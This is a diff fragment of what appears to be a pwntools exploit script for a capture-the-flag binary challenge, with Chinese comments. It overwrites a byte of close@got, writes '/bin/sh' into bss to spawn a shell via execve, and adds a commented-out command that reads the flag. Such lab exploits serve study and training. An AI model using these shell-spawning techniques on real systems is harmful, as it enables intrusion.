@@ -127,4 +127,6 @@ shell_payload = b'/bin/sh\x00'.ljust(0x3b, b'\x00')
 r.send(cus_payload)
 r.send(b'\x65')  # 修改close@got表的最后一个字节为0x65
 r.send(shell_payload)  # 控制rax=0x3b并在bss开头写入/bin/sh
+# r.sendline(b'cat /flag>&0')  # 仅在使用 socat 挂载的时候能用，本地 pwntools 起的就没有反应
+# print(r.recvall())
 r.interactive()
